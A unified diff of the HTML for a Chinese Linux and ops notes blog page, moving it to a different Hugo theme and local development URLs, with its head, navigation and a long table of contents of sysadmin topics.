@@ -1,13 +1,28 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="zh-cn">
 
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="robots" content="noodp" />
-    <title>那些杂七杂八的记录(一) - 一个曾经的小码农...</title><meta name="Description" content="那些杂七杂八的记录(一)"><meta property="og:url" content="https://blog.0x5c0f.cc/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  那些杂七杂八的记录(一) · 一个曾经的小码农...
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="description" content="那些杂七杂八的记录(一)">
+<meta name="keywords" content="[linux Hugo 解决方案 故障]">
+
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/icons/logo_avatar.png">
+  <meta name="twitter:title" content="那些杂七杂八的记录(一)">
+  <meta name="twitter:description" content="那些杂七杂八的记录(一)">
+
+<meta property="og:url" content="http://localhost:1313/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/">
   <meta property="og:site_name" content="一个曾经的小码农...">
   <meta property="og:title" content="那些杂七杂八的记录(一)">
   <meta property="og:description" content="那些杂七杂八的记录(一)">
@@ -18,319 +33,192 @@
     <meta property="article:modified_time" content="2024-10-09T00:00:00+00:00">
     <meta property="article:tag" content="Linux">
     <meta property="article:tag" content="解决方案">
-    <meta property="og:image" content="https://blog.0x5c0f.cc/icons/logo_avatar.png">
-      <meta property="og:see_also" content="https://blog.0x5c0f.cc/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/">
-      <meta property="og:see_also" content="https://blog.0x5c0f.cc/2023/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/">
-      <meta property="og:see_also" content="https://blog.0x5c0f.cc/2023/%E5%B8%B8%E7%94%A8%E7%9A%84bat%E8%84%9A%E6%9C%AC%E8%AF%AD%E6%B3%95/">
-      <meta property="og:see_also" content="https://blog.0x5c0f.cc/2022/http%E5%93%8D%E5%BA%94%E7%A0%81/">
-      <meta property="og:see_also" content="https://blog.0x5c0f.cc/2022/fedora%E8%A7%86%E9%A2%91%E6%A1%8C%E9%9D%A2/">
-      <meta property="og:see_also" content="https://blog.0x5c0f.cc/2022/gb2312unicode%E5%AF%B9%E7%85%A7%E8%A1%A8/">
+    <meta property="og:image" content="http://localhost:1313/icons/logo_avatar.png">
+      <meta property="og:see_also" content="http://localhost:1313/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/">
+      <meta property="og:see_also" content="http://localhost:1313/2023/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/">
+      <meta property="og:see_also" content="http://localhost:1313/2023/%E5%B8%B8%E7%94%A8%E7%9A%84bat%E8%84%9A%E6%9C%AC%E8%AF%AD%E6%B3%95/">
+      <meta property="og:see_also" content="http://localhost:1313/2022/http%E5%93%8D%E5%BA%94%E7%A0%81/">
+      <meta property="og:see_also" content="http://localhost:1313/2022/fedora%E8%A7%86%E9%A2%91%E6%A1%8C%E9%9D%A2/">
+      <meta property="og:see_also" content="http://localhost:1313/2022/gb2312unicode%E5%AF%B9%E7%85%A7%E8%A1%A8/">
 
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:image" content="https://blog.0x5c0f.cc/icons/logo_avatar.png">
-  <meta name="twitter:title" content="那些杂七杂八的记录(一)">
-  <meta name="twitter:description" content="那些杂七杂八的记录(一)">
-<meta name="application-name" content="DoIt">
-<meta name="apple-mobile-web-app-title" content="DoIt">
 
-<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/icons/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://blog.0x5c0f.cc/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/" /><link rel="prev" href="https://blog.0x5c0f.cc/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/" /><link rel="next" href="https://blog.0x5c0f.cc/2019/shellscript%E7%9B%B8%E5%85%B3/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
-        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
-        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
-    {
-        "@context": "http://schema.org",
-        "@type": "BlogPosting",
-        "headline": "那些杂七杂八的记录(一)",
-        "inLanguage": "zh-CN",
-        "mainEntityOfPage": {
-            "@type": "WebPage",
-            "@id": "https:\/\/blog.0x5c0f.cc\/2021\/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1\/"
-        },"genre": "posts","keywords": "linux, 解决方案","wordcount":  11468 ,
-        "url": "https:\/\/blog.0x5c0f.cc\/2021\/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1\/","datePublished": "2021-08-04T00:00:00+00:00","dateModified": "2024-10-09T00:00:00+00:00","publisher": {
-            "@type": "Organization",
-            "name": "作者"},"authors": [{
-                        "@type": "Person",
-                        "name": "admin"                    
-                    }],"description": "那些杂七杂八的记录(一)"
-    }
-    </script><script src="//instant.page/5.1.1" defer type="module" integrity="sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq"></script>
+
+
+<link rel="canonical" href="http://localhost:1313/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link rel="alternate" type="text/plain" href="/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/index.md" title="一个曾经的小码农..." />
+
+
+
+
+
+
+
 </head>
 
-<body header-desktop="auto" header-mobile="auto"><script type="text/javascript">
-        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme; }
-        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
-        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
-        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
-        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
-        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
-    </script>
-    <div id="back-to-top"></div>
-    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
-    <div class="header-wrapper">
-        <div class="header-title">
-            <a href="/" title="一个曾经的小码农..."><span id="desktop-header-typeit" class="typeit"></span></a>
-        </div>
-        <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/series/"> 系列 </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
-                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
-                        <a href="#" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
-                            <i class="fas fa-search fa-fw"></i>
-                        </a>
-                        <a href="#" class="search-button search-clear" id="search-clear-desktop" title="清空">
-                            <i class="fas fa-times-circle fa-fw"></i>
-                        </a>
-                        <span class="search-button search-loading" id="search-loading-desktop">
-                            <i class="fas fa-spinner fa-fw fa-spin"></i>
-                        </span>
-                    </span><a href="#" class="menu-item theme-switch" title="切换主题">
-                    <i class="fas fa-adjust fa-fw"></i>
-                </a></div>
-        </div>
-    </div>
-</header><header class="mobile" id="header-mobile">
-    <div class="header-container">
-        <div class="header-wrapper">
-            <div class="header-title">
-                <a href="/" title="一个曾经的小码农..."><span id="mobile-header-typeit" class="typeit"></span></a>
-            </div>
-            <div class="menu-toggle" id="menu-toggle-mobile">
-                <span></span><span></span><span></span>
-            </div>
-        </div>
-        <div class="menu" id="menu-mobile"><div class="search-wrapper">
-                    <div class="search mobile" id="search-mobile">
-                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
-                        <a href="#" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
-                            <i class="fas fa-search fa-fw"></i>
-                        </a>
-                        <a href="#" class="search-button search-clear" id="search-clear-mobile" title="清空">
-                            <i class="fas fa-times-circle fa-fw"></i>
-                        </a>
-                        <span class="search-button search-loading" id="search-loading-mobile">
-                            <i class="fas fa-spinner fa-fw fa-spin"></i>
-                        </span>
-                    </div>
-                    <a href="#" class="search-cancel" id="search-cancel-mobile">
-                        取消
-                    </a>
-                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/series/" title="">系列</a><a class="menu-item" href="/about/" title="">About</a><a href="#" class="menu-item theme-switch" title="切换主题">
-                <i class="fas fa-adjust fa-fw"></i>
-            </a></div>
-    </div>
-</header>
-<div class="search-dropdown desktop">
-    <div id="search-dropdown-desktop"></div>
+
+
+
+<body class="preload-transitions colorscheme-light">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
 </div>
-<div class="search-dropdown mobile">
-    <div id="search-dropdown-mobile"></div>
-</div>
-<main class="main">
-            <div class="container"><div class="toc" id="toc-auto">
-        <h2 class="toc-title">目录</h2>
-        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
-  <ul>
-    <li><a href="#gnupg-加密与解密">GnuPG 加密与解密</a>
-      <ul>
-        <li><a href="#gpg-对称加密">gpg 对称加密</a></li>
-        <li><a href="#gpg-非对称加密">gpg 非对称加密</a></li>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      一个曾经的小码农...
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">文章</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tags/">标签</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/categories/">分类</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/series/">系列</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
       </ul>
-    </li>
-    <li><a href="#docker-创建-dns-server">DOCKER 创建 DNS SERVER</a></li>
-    <li><a href="#dotnet-环境搭建">dotnet 环境搭建</a></li>
-    <li><a href="#在linux中删除virbr0接口">在Linux中删除virbr0接口</a></li>
-    <li><a href="#linux-杀毒软件-clamav">Linux 杀毒软件 clamav</a></li>
-    <li><a href="#linux-合并文件系统-margerfs">linux 合并文件系统 margerfs</a></li>
-    <li><a href="#linux-sftp-搭建">linux sftp 搭建</a></li>
-    <li><a href="#监听本地网卡上没有的ip地址">监听本地网卡上没有的IP地址</a></li>
-    <li><a href="#腾讯云第二块网卡绑定公网ip">腾讯云第二块网卡绑定公网ip</a></li>
-    <li><a href="#shell-反弹">shell 反弹</a></li>
-    <li><a href="#nginx-获取cdn真实用户ip">nginx 获取cdn真实用户ip</a></li>
-    <li><a href="#virtualbox---从主机端口80到virtualbox端口80的端口转发不起作用">virtualbox - 从主机端口80到VirtualBox端口80的端口转发不起作用</a></li>
-    <li><a href="#服务器默认端口优化">服务器默认端口优化</a></li>
-    <li><a href="#linux-下hosts文件和dns服务器的响应顺序">linux 下hosts文件和dns服务器的响应顺序</a></li>
-    <li><a href="#git-提交类型">git 提交类型</a></li>
-    <li><a href="#linux-通过s3fs挂载七牛云存储">linux 通过s3fs挂载七牛云存储</a></li>
-    <li><a href="#普通用户校验是否有权限通过dockersock操作-docker">普通用户校验是否有权限通过docker.sock操作 docker</a></li>
-    <li><a href="#rdesktop-远程桌面工具安装">rdesktop 远程桌面工具安装</a></li>
-    <li><a href="#umask-计算方法">Umask 计算方法</a></li>
-    <li><a href="#输入输出重定向">输入输出重定向</a>
-      <ul>
-        <li><a href="#文件描述符">文件描述符</a></li>
-        <li><a href="#标准重定向">标准重定向</a></li>
-      </ul>
-    </li>
-    <li><a href="#linux-下挂载-esxi-的-vmfs-文件系统">linux 下挂载 esxi 的 vmfs 文件系统</a></li>
-    <li><a href="#cp-mv-进度条补丁">cp mv 进度条补丁</a></li>
-    <li><a href="#更改docker容器中的时间而不影响宿主机">更改docker容器中的时间而不影响宿主机</a></li>
-    <li><a href="#ubuntudebian切换shelldashbash">ubuntu/debian切换shell（dash/bash）</a></li>
-    <li><a href="#openvpn-指定路由配置">openvpn 指定路由配置</a></li>
-    <li><a href="#svg-背景透明图片">svg 背景透明图片</a></li>
-    <li><a href="#centos-启用zram服务器内存过低可用于替代swap">CentOS 启用zram(服务器内存过低，可用于替代swap)</a></li>
-    <li><a href="#virtualbox-nat端口映射配置">virtualbox NAT端口映射配置</a>
-      <ul>
-        <li><a href="#单位换算">单位换算</a></li>
-        <li><a href="#mailx-smtp使用ssl时邮件发送报错-error-in-certificate-peers-certificate-issuer-is-not-recognized">mailx smtp使用ssl时，邮件发送报错 &ldquo;Error in certificate: Peer’s certificate issuer is not recognized.&rdquo;</a></li>
-        <li><a href="#jenkins-设置国内插件源">jenkins 设置国内插件源</a></li>
-      </ul>
-    </li>
-    <li><a href="#etcsysconfignetwork-scripts-为空">/etc/sysconfig/network-scripts 为空</a></li>
-    <li><a href="#双网卡优先级配置">双网卡优先级配置</a></li>
-    <li><a href="#网卡连接后执行某个脚本">网卡连接后执行某个脚本</a></li>
-    <li><a href="#网卡配置文件固定路由设置">网卡配置文件固定路由设置</a></li>
-    <li><a href="#acmesh-证书安装---reloadcmd无效问题">acme.sh 证书安装 <code>--reloadcmd</code>无效问题</a></li>
-    <li><a href="#openai-api接口反向代理实现国内直接使用">openai api接口反向代理实现国内直接使用</a></li>
-    <li><a href="#云安全组配置规范">云安全组配置规范</a></li>
-    <li><a href="#webmin-密码修改">webmin 密码修改</a></li>
-    <li><a href="#记录一个nginx-反代规则">记录一个nginx 反代规则</a></li>
-    <li><a href="#debian-pull-镜像-408-错误">debian pull 镜像 408 错误</a></li>
-    <li><a href="#在bash脚本中使用别名alias的方式">在bash脚本中使用别名(alias)的方式</a>
-      <ul>
-        <li><a href="#rabbitmq-ssl-证书配置">rabbitmq ssl 证书配置</a></li>
-        <li><a href="#prometheus-不同指标计间的计算方法">prometheus 不同指标计间的计算方法</a></li>
-        <li><a href="#iis-http-强制跳转-https">IIS http 强制跳转 https</a></li>
-        <li><a href="#find-文件性能提升">find 文件性能提升</a></li>
-        <li><a href="#压力测试-ab-命令解释">压力测试 `ab`` 命令解释</a></li>
-        <li><a href="#https页面加载http资源报错的方法">https页面加载http资源报错的方法</a></li>
-        <li><a href="#mysql-授权-all-privileges-时当前用户是具备执行-alter-user-的权限的但仅限于修改自己的密码无法修改其他用户">mysql 授权 ALL PRIVILEGES 时，当前用户是具备执行 ALTER USER 的权限的，但仅限于修改自己的密码，无法修改其他用户</a></li>
-        <li><a href="#windows-iis-反向代理配置">Windows IIS 反向代理配置</a></li>
-        <li><a href="#亚马逊存储桶">亚马逊存储桶</a>
-          <ul>
-            <li><a href="#存储桶规则创建及示例">存储桶规则创建及示例</a></li>
-            <li><a href="#亚马逊用户策略">亚马逊用户策略</a></li>
-          </ul>
-        </li>
-        <li><a href="#gnome-shell-终端设置-title">gnome-shell 终端设置 title</a></li>
-        <li><a href="#阿里云安装-alinux-操作系统安装-docker">阿里云安装 alinux 操作系统安装 docker</a></li>
-        <li><a href="#亚马逊cdn-添加-elb-作为后端源指定多备用域名无效有其他衍生问题-待继续测试">亚马逊cdn 添加 elb 作为后端源，指定多备用域名无效(有其他衍生问题, 待继续测试)</a></li>
-      </ul>
-    </li>
-    <li><a href="#亚马逊调整-ebs-卷大小后扩展文件系统磁盘扩容">亚马逊调整 EBS 卷大小后扩展文件系统(磁盘扩容)</a></li>
-    <li><a href="#亚马逊加速器配置">亚马逊加速器配置</a></li>
-    <li><a href="#阿里云磁盘分区扩容">阿里云磁盘分区扩容</a></li>
-    <li><a href="#网络故障记录">网络故障记录</a></li>
-    <li><a href="#linux-桌面环境下绑定指定唤起协议">linux 桌面环境下，绑定指定唤起协议</a></li>
-    <li><a href="#解决-virtualbox-仅主机模式无法定制ip网段的问题仅主机模式无法连接公网的问题">解决 Virtualbox 仅主机模式无法定制IP网段的问题(仅主机模式无法连接公网的问题)</a></li>
-    <li><a href="#grafana-查询错误-a-got-error-input-data-must-be-a-wide-series-but-got-type-long-input-refid">grafana 查询错误 <code>[A] got error: input data must be a wide series but got type long (input refid)</code></a></li>
-    <li><a href="#通过yum安装的mysql进行升级的时候报错-xxx-fileetcpkirpm-gpgrpm-gpg-key-mysql">通过yum安装的mysql进行升级的时候报错 <code>xxx file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql</code></a></li>
-    <li><a href="#nginx配置特定方法请求时进行密码认证">nginx配置特定方法请求时进行密码认证</a></li>
-    <li><a href="#服务器资源不够导致的问题">服务器资源不够导致的问题</a></li>
-    <li><a href="#通过systemd服务配置文件修改进程优先级">通过<code>systemd</code>服务配置文件修改进程优先级</a></li>
-    <li><a href="#git-删除最近几次提交记录">git 删除最近几次提交记录</a></li>
-  </ul>
-</nav></div>
-    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">那些杂七杂八的记录(一)</h1><div class="post-meta">
-            <div class="post-meta-line">
-                <span class="post-author"><span class='author'><i class="author fas fa-user-circle fa-fw"></i><span class='screen-reader-text'>  </span><a href='https://blog.0x5c0f.cc/authors/admin'>0x5c0f</a></span>
-                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/linux/"><i class="far fa-folder fa-fw"></i>Linux</a>&nbsp;<a href="/categories/%E8%BF%90%E7%BB%B4%E8%AE%B0%E4%BA%8B/"><i class="far fa-folder fa-fw"></i>运维记事</a></span>&nbsp;<span class="post-category">和</span>&nbsp;<span class="post-series">系列 <a href="/series/%E6%9D%82%E8%AE%B0/"><i class="far fa-list-alt fa-fw"></i>杂记</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-04">2021-08-04</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-10-09">2024-10-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 11468 字&nbsp;
-                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 23 分钟&nbsp;<span id="/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/" class="leancloud_visitors" data-flag-title="那些杂七杂八的记录(一)">
-                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class="leancloud-visitors-count waline-pageview-count" data-path="/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"></span>&nbsp;次阅读
-                    </span>&nbsp;<span id="/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/" class="comment_count" data-flag-title="那些杂七杂八的记录(一)">
-                        <i class="far fa-comments fa-fw"></i>&nbsp;<span class="waline-comment-count" id="waline-comment-count" data-path="/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"></span>&nbsp;条评论
-                    </span>&nbsp;<span>
-                        <i class="fas fa-balance-scale fa-fw"></i>&nbsp;<span><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">CC BY-NC-SA 4.0</a></span>&nbsp;
-                    </span>&nbsp;</div>
-        </div><div class="details toc" id="toc-static"  kept="">
-                <div class="details-summary toc-title">
-                    <span>目录</span>
-                    <span><i class="details-icon fas fa-angle-right"></i></span>
-                </div>
-                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
-  <ul>
-    <li><a href="#gnupg-加密与解密">GnuPG 加密与解密</a>
-      <ul>
-        <li><a href="#gpg-对称加密">gpg 对称加密</a></li>
-        <li><a href="#gpg-非对称加密">gpg 非对称加密</a></li>
-      </ul>
-    </li>
-    <li><a href="#docker-创建-dns-server">DOCKER 创建 DNS SERVER</a></li>
-    <li><a href="#dotnet-环境搭建">dotnet 环境搭建</a></li>
-    <li><a href="#在linux中删除virbr0接口">在Linux中删除virbr0接口</a></li>
-    <li><a href="#linux-杀毒软件-clamav">Linux 杀毒软件 clamav</a></li>
-    <li><a href="#linux-合并文件系统-margerfs">linux 合并文件系统 margerfs</a></li>
-    <li><a href="#linux-sftp-搭建">linux sftp 搭建</a></li>
-    <li><a href="#监听本地网卡上没有的ip地址">监听本地网卡上没有的IP地址</a></li>
-    <li><a href="#腾讯云第二块网卡绑定公网ip">腾讯云第二块网卡绑定公网ip</a></li>
-    <li><a href="#shell-反弹">shell 反弹</a></li>
-    <li><a href="#nginx-获取cdn真实用户ip">nginx 获取cdn真实用户ip</a></li>
-    <li><a href="#virtualbox---从主机端口80到virtualbox端口80的端口转发不起作用">virtualbox - 从主机端口80到VirtualBox端口80的端口转发不起作用</a></li>
-    <li><a href="#服务器默认端口优化">服务器默认端口优化</a></li>
-    <li><a href="#linux-下hosts文件和dns服务器的响应顺序">linux 下hosts文件和dns服务器的响应顺序</a></li>
-    <li><a href="#git-提交类型">git 提交类型</a></li>
-    <li><a href="#linux-通过s3fs挂载七牛云存储">linux 通过s3fs挂载七牛云存储</a></li>
-    <li><a href="#普通用户校验是否有权限通过dockersock操作-docker">普通用户校验是否有权限通过docker.sock操作 docker</a></li>
-    <li><a href="#rdesktop-远程桌面工具安装">rdesktop 远程桌面工具安装</a></li>
-    <li><a href="#umask-计算方法">Umask 计算方法</a></li>
-    <li><a href="#输入输出重定向">输入输出重定向</a>
-      <ul>
-        <li><a href="#文件描述符">文件描述符</a></li>
-        <li><a href="#标准重定向">标准重定向</a></li>
-      </ul>
-    </li>
-    <li><a href="#linux-下挂载-esxi-的-vmfs-文件系统">linux 下挂载 esxi 的 vmfs 文件系统</a></li>
-    <li><a href="#cp-mv-进度条补丁">cp mv 进度条补丁</a></li>
-    <li><a href="#更改docker容器中的时间而不影响宿主机">更改docker容器中的时间而不影响宿主机</a></li>
-    <li><a href="#ubuntudebian切换shelldashbash">ubuntu/debian切换shell（dash/bash）</a></li>
-    <li><a href="#openvpn-指定路由配置">openvpn 指定路由配置</a></li>
-    <li><a href="#svg-背景透明图片">svg 背景透明图片</a></li>
-    <li><a href="#centos-启用zram服务器内存过低可用于替代swap">CentOS 启用zram(服务器内存过低，可用于替代swap)</a></li>
-    <li><a href="#virtualbox-nat端口映射配置">virtualbox NAT端口映射配置</a>
-      <ul>
-        <li><a href="#单位换算">单位换算</a></li>
-        <li><a href="#mailx-smtp使用ssl时邮件发送报错-error-in-certificate-peers-certificate-issuer-is-not-recognized">mailx smtp使用ssl时，邮件发送报错 &ldquo;Error in certificate: Peer’s certificate issuer is not recognized.&rdquo;</a></li>
-        <li><a href="#jenkins-设置国内插件源">jenkins 设置国内插件源</a></li>
-      </ul>
-    </li>
-    <li><a href="#etcsysconfignetwork-scripts-为空">/etc/sysconfig/network-scripts 为空</a></li>
-    <li><a href="#双网卡优先级配置">双网卡优先级配置</a></li>
-    <li><a href="#网卡连接后执行某个脚本">网卡连接后执行某个脚本</a></li>
-    <li><a href="#网卡配置文件固定路由设置">网卡配置文件固定路由设置</a></li>
-    <li><a href="#acmesh-证书安装---reloadcmd无效问题">acme.sh 证书安装 <code>--reloadcmd</code>无效问题</a></li>
-    <li><a href="#openai-api接口反向代理实现国内直接使用">openai api接口反向代理实现国内直接使用</a></li>
-    <li><a href="#云安全组配置规范">云安全组配置规范</a></li>
-    <li><a href="#webmin-密码修改">webmin 密码修改</a></li>
-    <li><a href="#记录一个nginx-反代规则">记录一个nginx 反代规则</a></li>
-    <li><a href="#debian-pull-镜像-408-错误">debian pull 镜像 408 错误</a></li>
-    <li><a href="#在bash脚本中使用别名alias的方式">在bash脚本中使用别名(alias)的方式</a>
-      <ul>
-        <li><a href="#rabbitmq-ssl-证书配置">rabbitmq ssl 证书配置</a></li>
-        <li><a href="#prometheus-不同指标计间的计算方法">prometheus 不同指标计间的计算方法</a></li>
-        <li><a href="#iis-http-强制跳转-https">IIS http 强制跳转 https</a></li>
-        <li><a href="#find-文件性能提升">find 文件性能提升</a></li>
-        <li><a href="#压力测试-ab-命令解释">压力测试 `ab`` 命令解释</a></li>
-        <li><a href="#https页面加载http资源报错的方法">https页面加载http资源报错的方法</a></li>
-        <li><a href="#mysql-授权-all-privileges-时当前用户是具备执行-alter-user-的权限的但仅限于修改自己的密码无法修改其他用户">mysql 授权 ALL PRIVILEGES 时，当前用户是具备执行 ALTER USER 的权限的，但仅限于修改自己的密码，无法修改其他用户</a></li>
-        <li><a href="#windows-iis-反向代理配置">Windows IIS 反向代理配置</a></li>
-        <li><a href="#亚马逊存储桶">亚马逊存储桶</a>
-          <ul>
-            <li><a href="#存储桶规则创建及示例">存储桶规则创建及示例</a></li>
-            <li><a href="#亚马逊用户策略">亚马逊用户策略</a></li>
-          </ul>
-        </li>
-        <li><a href="#gnome-shell-终端设置-title">gnome-shell 终端设置 title</a></li>
-        <li><a href="#阿里云安装-alinux-操作系统安装-docker">阿里云安装 alinux 操作系统安装 docker</a></li>
-        <li><a href="#亚马逊cdn-添加-elb-作为后端源指定多备用域名无效有其他衍生问题-待继续测试">亚马逊cdn 添加 elb 作为后端源，指定多备用域名无效(有其他衍生问题, 待继续测试)</a></li>
-      </ul>
-    </li>
-    <li><a href="#亚马逊调整-ebs-卷大小后扩展文件系统磁盘扩容">亚马逊调整 EBS 卷大小后扩展文件系统(磁盘扩容)</a></li>
